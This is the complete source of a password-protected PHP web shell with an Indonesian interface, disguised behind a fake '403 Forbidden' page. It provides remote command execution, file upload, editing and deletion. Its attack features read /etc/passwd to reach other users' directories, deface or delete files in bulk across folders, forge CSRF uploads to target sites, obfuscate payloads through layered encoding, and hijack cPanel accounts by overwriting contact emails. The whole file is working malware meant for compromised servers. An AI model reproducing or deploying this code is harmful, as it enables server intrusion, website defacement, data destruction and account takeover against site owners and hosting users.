<?php
$pass = "cintahanna";
session_start();
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html><head><meta http-equiv="Content-Type" content="text/html; charset=windows-1256" /></head><body>
<?php
if (!empty($_GET['array']) &&  $_GET['array'] == "logout") {session_destroy();unset ($_SESSION['pass']);}

$path_name = pathinfo($_SERVER['PHP_SELF']);
$this_script = $path_name['basename'];
if (empty($_SESSION['pass'])) {$_SESSION['pass']='';}
if (empty($_POST['pass'])) {$_POST['pass']='';}
if ( $_SESSION['pass']!== $pass) 
{
    if ($_POST['pass'] == $pass) {$_SESSION['pass'] = $pass; }
    else 
    {
        echo '<!DOCTYPE html>
<html lang="en" dir="ltr">
<head>
        <link href="" rel="stylesheet" type="text/css">
	<meta charset="utf-8">
	<title> 403 Forbidden </title>
	<style>
body{
	margin: 0;
	padding: 0;
	font-family: fantasy;
        background: url();
        background-size: 350px 300px;
	background-color: white;
}
input[type = "text"]{
       background: none; 
       color: black; 
       border: 2px solid transparent;
       margin: 1px auto;
       padding-left: 1px;
       font-family: fantasy;
       font-size: 38px;
       width: 200px;
       font-weight: 900;
}
</style>
<style type="text/css">@import url("https://fonts.googleapis.com/css?family=Fredericka+the+Great|Kaushan+Script|Press+Start+2P|Rationale")
</style>
</head>
<iframe width="0" height="0" src="https://www.suhunan.sukabumikab.go.id/defacer-kampungan.mp3" frameborder="0" allowfullscreen></iframe>
<body>
<link href="https://fonts.googleapis.com/css?family=Lacquer|&display=swap" rel="stylesheet"><font-family="sans serif>'; ?>
<?php
$errorforbidden = $_SERVER['REQUEST_URI'];
?>
<?php
	echo '<form class="box" action="'.$_SERVER['PHP_SELF'].'" method="post">'; ?> <hr color="white">
<b><input type="text" name="pass" value="Forbidden"></b>
<p>&nbsp;You don't have permission to access <?php print $errorforbidden; ?>
 on this server.</p>
<p>&nbsp;Additionally, a 404 Not Found error was encountered while trying to use an ErrorDocument to handle the request.</p><hr>
<i>&nbsp;Apache/2.2.14 (Ubuntu) Server at localhost Port 80</i>
<?php
echo '</form>
</body>
</html> ';
        exit;
    }
}
?>

<style type="text/css">@font-face { font-family: 'Iceberg'; font-style: normal; font-weight: 400; src: local('Iceberg'), local('Iceberg-Regular'), url(https://fonts.gstatic.com/s/iceberg/v7/8QIJdijAiM7o-qnZiI8EqprnEO0.woff2) format('woff2'); unicode-range: U+-0000-00FF, U+-0131, U+-0152-0153, U+-02BB-02BC, U+-02C6, U+-02DA, U+-02DC, U+-2000-206F, U+-2074, U+-20AC, U+-2122, U+-2191, U+-2193, U+-2212, U+-2215, U+-FEFF, U+-FFFD; }
</style>
<?php
error_reporting(0);
set_time_limit(0);

if(get_magic_quotes_gpc()){
foreach($_POST as $key=>$value){
$_POST[$key] = stripslashes($value);
}
}

echo '<!DOCTYPE HTML>
<html>
<head>
<link href="" rel="stylesheet" type="text/css">
<title>.: M1N1 :.</title>
<!-- Styles -->	
<style>
body {
  background-image: url("https://i.ibb.co/tXcSXnD/Screenshot-2020-10-18-13-58-47-03.png");
  background-position: center;
  background-repeat: no-repeat;
  background-size: cover;
}
</style>
<style>
body{
font-family: "Iceberg";
background-color: #000000;
color:crimson;
}
#content tr:hover{
background-color: #DC143C;
text-shadow:0px 0px 10px #fff;
}

#content .first{
background-color: #000000;
}
table{
border: 1px #00FFFF; dotted;
}
a{
color:yellow;
text-decoration: none;
}
a:hover{
color:red;
text-shadow:0px 0px 10px #ffffff;
}
input,select{
	margin:auto;
 	border:1px #00FFFF; solid ;
background: transparent;
color:red;

-moz-border-radius: 5px;
-webkit-border-radius:5px;
border-radius:5px;
}
textarea {
	margin:auto;
 	border:1px #FF1493; solid ;
 	background:transparent;
 	color:aquamarine;
 	font-size:12px;
 	-moz-border-radius: 5px;
 	-webkit-border-radius:5px;
  border-radius:5px;
}
</style>
<style type="text/css">@import url("https://fonts.googleapis.com/css?family=Fredericka+the+Great|Kaushan+Script|Press+Start+2P|Rationale")
</style>
</head>
<body>
<link href="https://fonts.googleapis.com/css?family=Lacquer|&display=swap" rel="stylesheet">
<center>

<h1><center><b><font face="lacquer" color="red">dian  &#9829; <font face="lacquer" color="white">hanna</font></b><br>
			</center></h1>
			<font face="iceberg">
<table width="700" border="0" cellpadding="3" cellspacing="1" align="center">
<tr><td><font color="lime">Path :</font> ';
if(isset($_GET['path'])){
$path = $_GET['path'];
}else{
$path = getcwd();
}
$path = str_replace('','/',$path);
$paths = explode('/',$path);
foreach($paths as $id=>$pat){
if($pat == '' && $id == 0){
$a = true;
echo '<a href="?path=/">/</a>';
continue;
}
if($pat == '') continue;
echo '<a href="?path=';
for($i=0;$i<=$id;$i++){
echo "$paths[$i]";
if($i != $id) echo "/";
}
echo '">'.$pat.'</a>/';
}
echo '</td></tr><tr><td>';
if(isset($_FILES['file'])){
if(copy($_FILES['file']['tmp_name'],$path.'/'.$_FILES['file']['name'])){
echo '<font color="lime">Upload Berhasil</font><br />';
}else{
echo '<font color="white">Upload Gagal</font><br/>';
}
}
echo '<form enctype="multipart/form-data" method="POST">
<font color="lime">File Upload :</font> <input type="file" name="file" />
<input type="submit" value="upload" />
</form>';
echo "<form method='post'>
<font color='lime'>Command :</font>
<input type='text' size='30' height='10' name='cmd'><input type='submit' name='execmd' value=' Execute '>
</form>";
echo "</td></tr>";
echo "<center><font color=aqua>[ <a href='?'>HOM</a> ]
[ <a href='?path=$path&array=jumping'>JAMPING</a> ] 
[ <a href='?path=$path&array=mass_deface'>MASSDEF</a> ] 
[ <a href='?path=$path&array=server_info'>SERPER </a> ] 
[ <a href='?path=$path&array=mass_delete'>MASSDEL</a> ] 
[ <a href='?path=$path&array=newfile'>FILE</a> ] <br>
[ <a href='?path=$path&array=newfolder'>FOLDER</a> ] 
[ <a href='?path=$path&array=endecode'>ENCODECOD </a> ] 
[ <a href='?path=$path&array=csrf'>CSRF </a> ]<br>
[ <a href='?path=$path&array=cpanel'>RESCEPE</a> ] 
[ <a href='?path=$path&array=about'>ABOUT</a> ] 
[ <a href='?array=logout'>LOGOUT</a> ] </center><br>
";
if(isset($_GET['filesrc'])){
echo "<tr><td>Current File : ";
echo $_GET['filesrc'];
echo '</tr></td></table><br />';
echo('<pre>'.htmlspecialchars(file_get_contents($_GET['filesrc'])).'</pre>');
}elseif(isset($_GET['option']) && $_POST['opt'] != 'delete'){
echo '</table><br /><center>'.$_POST['path'].'<br /><br />';
if($_POST['opt'] == 'chmod'){
if(isset($_POST['perm'])){
if(chmod($_POST['path'],$_POST['perm'])){
echo '<font color="lime">Change Permission Berhasil</font><br/>';
}else{
echo '<font color="white">Change Permission Gagal</font><br />';
}
}
echo '<form method="POST">
Permission : <input name="perm" type="text" size="4" value="'.substr(sprintf('%o', fileperms($_POST['path'])), -4).'" />
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="chmod">
<input type="submit" value="Go" />
</form>';
}elseif($_POST['opt'] == 'rename'){
if(isset($_POST['newname'])){
if(rename($_POST['path'],$path.'/'.$_POST['newname'])){
echo '<font color="lime">Ganti Nama Berhasil</font><br/>';
}else{
echo '<font color="white">Ganti Nama Gagal</font><br />';
}
$_POST['name'] = $_POST['newname'];
}
echo '<form method="POST">
New Name : <input name="newname" type="text" size="20" value="'.$_POST['name'].'" />
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="rename">
<input type="submit" value="Go" />
</form>';
}elseif($_POST['opt'] == 'edit'){
if(isset($_POST['src'])){
$fp = fopen($_POST['path'],'w');
if(fwrite($fp,$_POST['src'])){
echo '<font color="lime">Berhasil Edit File</font><br/>';
}else{
echo '<font color="white">Gagal Edit File</font><br/>';
}
fclose($fp);
}
echo '<form method="POST">
<textarea cols=80 rows=20 name="src">'.htmlspecialchars(file_get_contents($_POST['path'])).'</textarea><br />
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="edit">
<input type="submit" value="Save" />
</form>';
}
echo '</center>';
}else{
echo '</table><br/><center>';
if(isset($_GET['option']) && $_POST['opt'] == 'delete'){
if($_POST['type'] == 'dir'){
if(rmdir($_POST['path'])){
echo '<font color="lime">Directory Terhapus</font><br/>';
}else{
echo '<font color="white">Directory Gagal Terhapus                                                                                                                                                                                                                                                                                             </font><br/>';
}
}elseif($_POST['type'] == 'file'){
if(unlink($_POST['path'])){
echo '<font color="lime">File Terhapus</font><br/>';
}else{
echo '<font color="white">File Gagal Dihapus</font><br/>';
}
}
}
// command
if($_POST['execmd']) {
echo "<center><textarea cols='60' rows='10' readonly='readonly' style='color:purple; background-color:lime;'>".exe($_POST['cmd'])."</textarea></center>";
}
// about
elseif($_GET['array'] == 'about'){
echo "<center>أ— 
<a style='text-decoration:none;' href='https://www.facebook.com/dmz.hari.9/'>My Facebook</a> أ—<br>
أ— <a style='text-decoration:none;' href='http://wa.me/+6283822080039'>My Whatsapp</a> أ—<br>
أ— <a style='text-decoration:none;' href='mailto:harigrimorum999@gmail.com'>My Mail</a> أ—<br>
أ— <a style='text-decoration:none;' href='https://www.facebook.com/MbtGanns/'>My Team Fanspage</a> أ—<br>
</center><br>";
}
//Jumping
elseif($_GET['array'] == 'jumping'){
	$i = 0;
	echo "<div class='margin: 5px auto;'>";
	if(preg_match("/hsphere/", $dir)) {
		$urls = explode("\r\n", $_POST['url']);
		if(isset($_POST['jump'])) {
			echo "<pre>";
			foreach($urls as $url) {
				$url = str_replace(array("http://","www."), "", strtolower($url));
				$etc = "/etc/passwd";
				$f = fopen($etc,"r");
				while($gets = fgets($f)) {
					$pecah = explode(":", $gets);
					$user = $pecah[0];
					$dir_user = "/hsphere/local/home/$user";
					if(is_dir($dir_user) === true) {
						$url_user = $dir_user."/".$url;
						if(is_readable($url_user)) {
							$i++;
							$jrw = "[<font color=lime>R</font>] <a href='?dir=$url_user'><font color=gold>$url_user</font></a>";
							if(is_writable($url_user)) {
								$jrw = "[<font color=lime>RW</font>] <a href='?dir=$url_user'><font color=gold>$url_user</font></a>";
							}
							echo $jrw."<br>";
						}
					}
				}
			}
		if($i == 0) { 
		} else {
			echo "<br>Total ada ".$i." Kamar di ".$ip;
		}
		echo "</pre>";
		} else {
			echo '<center>
				  <form method="post">
				  List Domains: <br>
				  <textarea name="url" style="width: 500px; height: 250px;">';
			$fp = fopen("/hsphere/local/config/httpd/sites/sites.txt","r");
			while($getss = fgets($fp)) {
				echo $getss;
			}
			echo  '</textarea><br>
				  <input type="submit" value="Jumping" name="jump" style="width: 500px; height: 25px;">
				  </form></center>';
		}
	} elseif(preg_match("/vhosts|vhost/", $dir)) {
		preg_match("/\/var\/www\/(.*?)\//", $dir, $vh);
		$urls = explode("\r\n", $_POST['url']);
		if(isset($_POST['jump'])) {
			echo "<pre>";
			foreach($urls as $url) {
				$url = str_replace("www.", "", $url);
				$web_vh = "/var/www/".$vh[1]."/$url/httpdocs";
				if(is_dir($web_vh) === true) {
					if(is_readable($web_vh)) {
						$i++;
						$jrw = "[<font color=lime>R</font>] <a href='?dir=$web_vh'><font color=gold>$web_vh</font></a>";
						if(is_writable($web_vh)) {
							$jrw = "[<font color=lime>RW</font>] <a href='?dir=$web_vh'><font color=gold>$web_vh</font></a>";
						}
						echo $jrw."<br>";
					}
				}
			}
		if($i == 0) { 
		} else {
			echo "<br>Total ada ".$i." Kamar di ".$ip;
		}
		echo "</pre>";
		} else {
			echo '<center>
				  <form method="post">
				  List Domains: <br>
				  <textarea name="url" style="width: 500px; height: 250px;">';
				  bing("ip:$ip");
			echo  '</textarea><br>
				  <input type="submit" value="Jumping" name="jump" style="width: 500px; height: 25px;">
				  </form></center>';
		}
	} else {
		echo "<pre>";
		$etc = fopen("/etc/passwd", "r") or die("<font color=red>Can't read /etc/passwd</font>");
		while($passwd = fgets($etc)) {
			if($passwd == '' || !$etc) {
				echo "<font color=red>Can't read /etc/passwd</font>";
			} else {
				preg_match_all('/(.*?):x:/', $passwd, $user_jumping);
				foreach($user_jumping[1] as $user_idx_jump) {
					$user_jumping_dir = "/home/$user_idx_jump/public_html";
					if(is_readable($user_jumping_dir)) {
						$i++;
						$jrw = "[<font color=lime>R</font>] <a href='?dir=$user_jumping_dir'><font color=gold>$user_jumping_dir</font></a>";
						if(is_writable($user_jumping_dir)) {
							$jrw = "[<font color=lime>RW</font>] <a href='?dir=$user_jumping_dir'><font color=gold>$user_jumping_dir</font></a>";
						}
						echo $jrw;
						if(function_exists('posix_getpwuid')) {
							$domain_jump = file_get_contents("/etc/named.conf");	
							if($domain_jump == '') {
								echo " => ( <font color=red>gabisa ambil nama domain nya</font> )<br>";
							} else {
								preg_match_all("#/var/named/(.*?).db#", $domain_jump, $domains_jump);
								foreach($domains_jump[1] as $dj) {
									$user_jumping_url = posix_getpwuid(@fileowner("/etc/valiases/$dj"));
									$user_jumping_url = $user_jumping_url['name'];
									if($user_jumping_url == $user_idx_jump) {
										echo " => ( <u>$dj</u> )<br>";
										break;
									}
								}
							}
						} else {
							echo "<br>";
						}
					}
				}
			}
		}
		if($i == 0) { 
		} else {
			echo "<br>Total ada ".$i." Kamar di ".$ip;
		}
		echo "</pre>";
	}
	echo "</div>";
}

//Server Info
elseif($_GET['array'] == 'server_info'){
	
echo "<i><font color='#8818A6' >Software : </font>";
   echo "<font size=2 color='red'><b>".$_SERVER['SERVER_SOFTWARE']."</b></font><br></i>";
   echo "<i><font color='#8818A6'>PHP Version : </font>";
   echo "<font size=2 color='red'><b>".PHP_VERSION."</b></font></i>";
   echo "<i><font color='white' > | </font></i>";
   echo "<i><font color='#8818A6'>OS : </font>";
   echo "<font size=2 color='red'><b>".PHP_OS."</b></font></i>";
   echo "<br><i><font color='#8818A6'>Your IP : </font>";
   echo "<font size=2 color='red'><b>".$_SERVER['REMOTE_ADDR']."</b></font></i>";
   echo "<i><font color='white' > | </font></i>";
   echo "<i><font color='#8818A6'>Server IP : </font>";
   echo "<font size=2 color='red'><b>".gethostbyname($_SERVER['HTTP_HOST'])."</b></font><br></i>";
    echo "<i><font color='#8818A6'>Server : </font>";
    echo "
    <font size=2 color='red'><b>".php_uname()."</b></font></i><br><br>";
}
// mass deface
elseif($_GET['array'] == 'mass_deface') {
	function sabun_massal($dir,$namafile,$isi_script) {
		if(is_writable($dir)) {
			$dira = scandir($dir);
			foreach($dira as $dirb) {
				$dirc = "$dir/$dirb";
				$lokasi = $dirc.'/'.$namafile;
				if($dirb === '.') {
					file_put_contents($lokasi, $isi_script);
				} elseif($dirb === '..') {
					file_put_contents($lokasi, $isi_script);
				} else {
					if(is_dir($dirc)) {
						if(is_writable($dirc)) {
							echo "[<font color=lime>DONE</font>] $lokasi<br>";
							file_put_contents($lokasi, $isi_script);
							$idx = sabun_massal($dirc,$namafile,$isi_script);
						}
					}
				}
			}
		}
	}
	function sabun_biasa($dir,$namafile,$isi_script) {
		if(is_writable($dir)) {
			$dira = scandir($dir);
			foreach($dira as $dirb) {
				$dirc = "$dir/$dirb";
				$lokasi = $dirc.'/'.$namafile;
				if($dirb === '.') {
					file_put_contents($lokasi, $isi_script);
				} elseif($dirb === '..') {
					file_put_contents($lokasi, $isi_script);
				} else {
					if(is_dir($dirc)) {
						if(is_writable($dirc)) {
							echo "[<font color=lime>DONE</font>] $lokasi<br>";
							file_put_contents($lokasi, $isi_script);
						}
					}
				}
			}
		}
	}
	if($_POST['start']) {
		if($_POST['tipe_sabun'] == 'mahal') {
			echo "<div style='margin: 5px auto; padding: 5px'>";
			sabun_massal($_POST['d_dir'], $_POST['d_file'], $_POST['script']);
			echo "</div>";
		} elseif($_POST['tipe_sabun'] == 'murah') {
			echo "<div style='margin: 5px auto; padding: 5px'>";
			sabun_biasa($_POST['d_dir'], $_POST['d_file'], $_POST['script']);
			echo "</div>";
		}
	} else {
	echo "<center>";
	echo "<form method='post'>
	<font color='aqua'>Tipe Mass Deface:</font><br>
	<input type='radio' name='tipe_sabun' value='murah' checked>Biasa<input type='radio' name='tipe_sabun' value='mahal'>Massal<br>
	<font color='lime'>Folder:</font><br>
	<input type='text' name='d_dir' value='$path' style='width: 450px;' height='10'><br>
	<font color='lime'>Filename:</font><br>
	<input type='text' name='d_file' value='array.html' style='width: 450px;' height='10'><br>
	<font color='lime'>Index File:</font><br>
	<textarea name='script' style='width: 450px; height: 200px;'>Hacked by Manusia Biasa Team</textarea><br>
	<input type='submit' name='start' value='Mass Deface' style='width: 450px;'><br><br><br>
	</form></center>";
	}
}
// mass delete
 elseif($_GET['array'] == 'mass_delete') {
	function hapus_massal($dir,$namafile) {
		if(is_writable($dir)) {
			$dira = scandir($dir);
			foreach($dira as $dirb) {
				$dirc = "$dir/$dirb";
				$lokasi = $dirc.'/'.$namafile;
				if($dirb === '.') {
					if(file_exists("$dir/$namafile")) {
						unlink("$dir/$namafile");
					}
				} elseif($dirb === '..') {
					if(file_exists("".dirname($dir)."/$namafile")) {
						unlink("".dirname($dir)."/$namafile");
					}
				} else {
					if(is_dir($dirc)) {
						if(is_writable($dirc)) {
							if(file_exists($lokasi)) {
								echo "[<font color=lime>DELETED</font>] $lokasi<br>";
								unlink($lokasi);
								$idx = hapus_massal($dirc,$namafile);
							}
						}
					}
				}
			}
		}
	}
	if($_POST['start']) {
		echo "<div style='margin: 5px auto; padding: 5px'>";
		hapus_massal($_POST['d_dir'], $_POST['d_file']);
		echo "</div>";
	} else {
	echo "<center>";
	echo "<form method='post'>
	<font color='lime'>Folder:</font><br>
	<input type='text' name='d_dir' value='$path' style='width: 450px;' height='10'><br>
	<font color='lime'>Filename:</font><br>
	<input type='text' name='d_file' value='array.php' style='width: 450px;' height='10'><br>
	<input type='submit' name='start' value='Mass Delete' style='width: 450px;'> <br><br><br>
	</form></center>";
	}
}
// create file
elseif($_GET['array'] == 'newfile') {
	if($_POST['new_save_file']) {
		$newfile = htmlspecialchars($_POST['newfile']);
		$fopen = fopen($newfile, "a+");
		if($fopen) {
			$act = "<script>window.location='?option&path=".$path."/".$_POST['newfile']."';</script>";
		} else {
			$option = "<font color=red>permission denied</font>";
		}
	}
	echo $option;
	echo "<form method='post'>
	<font color='lime'>Filename:</font> <input type='text' name='newfile' value='$path/newfile.php' style='width: 450px;' height='10'>
	<input type='submit' name='new_save_file' value='Submit'>
	</form><br><br>";
}
// create dir / folder
 elseif($_GET['array'] == 'newfolder') {
	if($_POST['new_save_folder']) {
		$new_folder = $path.'/'.htmlspecialchars($_POST['newfolder']);
		if(!mkdir($new_folder)) {
			$option = "<font color=red>permission denied</font>";
		} else {
			$act = "<script>window.location='?path=".$path."';</script>";
		}
	}
	echo $option;
	echo "<form method='post'>
	<font color='lime'>Folder Name:</font> <input type='text' name='newfolder' style='width: 450px;' height='10'>
	<input type='submit' name='new_save_folder' value='Submit'>
	</form><br><br>";
}
// csrf exploiter
elseif($_GET['array'] == 'csrf'){
	echo '<html>
	<form method="post" style="font-size:20px;">
	<font color="lime">URL:</font> <input type="text" name="url" size="50" height="10" placeholder="http://www.target.com/path/upload.php" style="margin: 5px auto; padding-left: 5px;" required><br>
	<font color="lime">POST File:</font> <input type="text" name="pf" size="50" height="10" placeholder="uploadfile / files[] / qqfile / dll" style="margin: 5px auto; padding-left: 5px;" required><br>
	<input type="submit" name="d" value="Lock!">
	</form><br><br>';
	$url = $_POST["url"];
	$pf = $_POST["pf"];
	$d = $_POST["d"];
	if($d) {
		echo "<form method='post' target='_blank' action='$url' enctype='multipart/form-data'><input type='file' name='$pf'><input type='submit' name='g' value='Upload'></form></form><br><br>
		</html>";
	}
}
// encode / decode
elseif($_GET['array'] == 'endecode') {
	$text = $_POST['code'];
$submit = $_POST['submit'];
if (isset($submit)){
$op = $_POST["ope"];
switch ($op) {case 'base64': $codi=base64_encode($text);
break;case 'str' : $codi=(base64_encode(str_rot13(gzdeflate(str_rot13($text)))));
break;case 'json' : $codi=json_encode(utf8_encode($text));
break;case 'gzinflate' : $codi=base64_encode(gzdeflate(str_rot13($text)));
break;case 'gzinflater' : $codi=base64_encode(str_rot13(gzdeflate($text)));
break;case 'gzinflatex' : $codi=base64_encode(gzdeflate(str_rot13(gzdeflate($text))));
break;case 'gzinflatew' : $codi=base64_encode(gzdeflate(str_rot13(rawurlencode(gzdeflate(convert_uuencode(base64_encode(str_rot13(gzdeflate(convert_uuencode(rawurldecode(str_rot13($text))))))))))));
break;case 'gzinflates' : $codi=base64_encode(gzdeflate($text));
break;case 'str2' : $codi=base64_encode(str_rot13($text));
break;case 'urlencode' : $codi=rawurlencode($text);
break;case 'ur' : $codi=convert_uuencode($text);
break;case 'url' : $codi=base64_encode(gzdeflate(convert_uuencode(str_rot13(gzdeflate(base64_encode($text))))));
break;default:break;}}

$submit = $_POST['submits'];
if (isset($submit)){
$op = $_POST["ope"];
switch ($op) {case 'base64': $codi=base64_decode($text);
break;case 'str' : $codi=str_rot13(gzinflate(str_rot13(base64_decode(($text)))));
break;case 'json' : $codi=utf8_dencode(json_dencode($text));
break;case 'gzinflate' : $codi=str_rot13(gzinflate(base64_decode($text)));
break;case 'gzinflater' : $codi=gzinflate(str_rot13(base64_decode($text)));
break;case 'gzinflatex' : $codi=gzinflate(str_rot13(gzinflate(base64_decode($text))));
break;case 'gzinflatew' : $codi=str_rot13(rawurldecode(convert_uudecode(gzinflate(str_rot13(base64_decode(convert_uudecode(gzinflate(rawurldecode(str_rot13(gzinflate(base64_decode($text))))))))))));
break;case 'gzinflates' : $codi=gzinflate(base64_decode($text));
break;case 'str2' : $codi=str_rot13(base64_decode($text));
break;case 'urlencode' : $codi=rawurldecode($text);
break;case 'ur' : $codi=convert_uudecode($text);
break;case 'url' : $codi=base64_decode(gzinflate(str_rot13(convert_uudecode(gzinflate(base64_decode(($text)))))));
break;default:break;}}
$html = htmlentities(stripslashes($codi));
echo '
<form method="post"><br>
<textarea cols=80 rows=10 name="code"></textarea><br><br>
<select size="1" name="ope">
<center><option value="urlencode">url</option>
<option value="base64">Base64</option>
<option value="ur">convert_uu</option>
<option value="gzinflates">gzinflate - base64</option>
<option value="str2">str_rot13 - base64</option>
<option value="gzinflate">str_rot13 - gzinflate - base64</option>
<option value="gzinflater">gzinflate - str_rot13 - base64</option>
<option value="gzinflatex">gzinflate - str_rot13 - gzinflate - base64</option>
<option value="str">str_rot13 - gzinflate - str_rot13 - base64</option>
<option value="url">base64 - gzinflate - str_rot13 - convert_uu - gzinflate - base64</option></center>
</select>&nbsp;<br><br><input type="submit" name="submit" value="Encode">
<input type="submit" name="submits" value="Decode">
</form>
<br>';
echo "</from><textarea cols=80 rows=10>".$html."</textarea><BR/><BR/></center><br></from>";
}
// cpanel reset password
elseif($_GET['array'] == 'cpanel'){
echo '<font color="lime" size="5"><b>Reset Password Cpanel</b></font><br>
	<p>   
	    <form action="#" method="post">
	    <b> Email : </b>
	<input type="email" name="email">
	<input type="submit" name="submit" value="Send">
	
	</form>
	</p>
	<br>';

$user = get_current_user();
$site = $_SERVER['HTTP_HOST'];
$ips = getenv('REMOTE_ADDR');

if(isset($_POST['submit'])){
	
	$email = $_POST['email'];
	$wr = 'email:'.$email;
$f = fopen('/home/'.$user.'/.cpanel/contactinfo', 'w');
fwrite($f, $wr); 
fclose($f);
$f = fopen('/home/'.$user.'/.contactinfo', 'w');
fwrite($f, $wr); 
fclose($f);
$parm = $site.':2083/resetpass?start=1';
echo '<center><hr color="green">Done by Array Gans<br><a href="'.$parm.'">Klik disini</a></center><hr color="green"><br><br>';
}
}


echo '</center>';
$scandir = scandir($path);
echo '<div id="content"><table width="700" border="0" cellpadding="3" cellspacing="1" align="center" color="black">
<tr class="first">
<td><center>Name</peller></center></td>
<td><center>Size</peller></center></td>
<td><center>Permission</peller></center></td>
<td><center>Modify</peller></center></td>
</tr>';

foreach($scandir as $dir){
if(!is_dir($path.'/'.$dir) || $dir == '.' || $dir == '..') continue;
echo '<tr>
<td><a href="?path='.$path.'/'.$dir.'">'.$dir.'</a></td>
<td><center>--</center></td>
<td><center>';
if(is_writable($path.'/'.$dir)) echo '<font color="lime">';
elseif(!is_readable($path.'/'.$dir)) echo '<font color="white">';
echo perms($path.'/'.$dir);
if(is_writable($path.'/'.$dir) || !is_readable($path.'/'.$dir)) echo '</font>';

echo '</center></td>
<td><center><form method="POST" action="?option&path='.$path.'">
<select name="opt">
<option value="">Select</option>
<option value="delete">Delete</option>
<option value="chmod">Chmod</option>
<option value="rename">Rename</option>
</select>
<input type="hidden" name="type" value="dir">
<input type="hidden" name="name" value="'.$dir.'">
<input type="hidden" name="path" value="'.$path.'/'.$dir.'">
<input type="submit" value=">">
</form></center></td>
</tr>';
}
echo '<tr class="first"><td></td><td></td><td></td><td></td></tr>';
foreach($scandir as $file){
if(!is_file($path.'/'.$file)) continue;
$size = filesize($path.'/'.$file)/1024;
$size = round($size,3);
if($size >= 1024){
$size = round($size/1024,2).' MB';
}else{
$size = $size.' KB';
}

echo '<tr>
<td><a href="?filesrc='.$path.'/'.$file.'&path='.$path.'">'.$file.'</a></td>
<td><center>'.$size.'</center></td>
<td><center>';
if(is_writable($path.'/'.$file)) echo '<font color="lime">';
elseif(!is_readable($path.'/'.$file)) echo '<font color="white">';
echo perms($path.'/'.$file);
if(is_writable($path.'/'.$file) || !is_readable($path.'/'.$file)) echo '</font>';
echo '</center></td>
<td><center><form method="POST" action="?option&path='.$path.'">
<select name="opt">
<option value="">Select</option>
<option value="delete">Delete</option>
<option value="chmod">Chmod</option>
<option value="rename">Rename</option>
<option value="edit">Edit</option>
</select>
<input type="hidden" name="type" value="file">
<input type="hidden" name="name" value="'.$file.'">
<input type="hidden" name="path" value="'.$path.'/'.$file.'">
<input type="submit" value=">">
</form></center></td>
</tr>';
}
echo '</table>
</div>';
}
echo '<font color="aquamarine" size="2px"><center><br/><b>Copyright &copy; Rebirth Haxor </center></font>

</body>
</html>';
function perms($file){
$perms = fileperms($file);

if (($perms & 0xC000) == 0xC000) {
// Socket
$info = 's';
} elseif (($perms & 0xA000) == 0xA000) {
// Symbolic Link
$info = 'l';
} elseif (($perms & 0x8000) == 0x8000) {
// Regular
$info = '-';
} elseif (($perms & 0x6000) == 0x6000) {
// Block special
$info = 'b';
} elseif (($perms & 0x4000) == 0x4000) {
// Directory
$info = 'd';
} elseif (($perms & 0x2000) == 0x2000) {
// Character special
$info = 'c';
} elseif (($perms & 0x1000) == 0x1000) {
// FIFO pipe
$info = 'p';
} else {
// Unknown
$info = 'u';
}

// Owner
$info .= (($perms & 0x0100) ? 'r' : '-');
$info .= (($perms & 0x0080) ? 'w' : '-');
$info .= (($perms & 0x0040) ?
(($perms & 0x0800) ? 's' : 'x' ) :
(($perms & 0x0800) ? 'S' : '-'));

// Group
$info .= (($perms & 0x0020) ? 'r' : '-');
$info .= (($perms & 0x0010) ? 'w' : '-');
$info .= (($perms & 0x0008) ?
(($perms & 0x0400) ? 's' : 'x' ) :
(($perms & 0x0400) ? 'S' : '-'));

// World
$info .= (($perms & 0x0004) ? 'r' : '-');
$info .= (($perms & 0x0002) ? 'w' : '-');
$info .= (($perms & 0x0001) ?
(($perms & 0x0200) ? 't' : 'x' ) :
(($perms & 0x0200) ? 'T' : '-'));

return $info;
}
?>

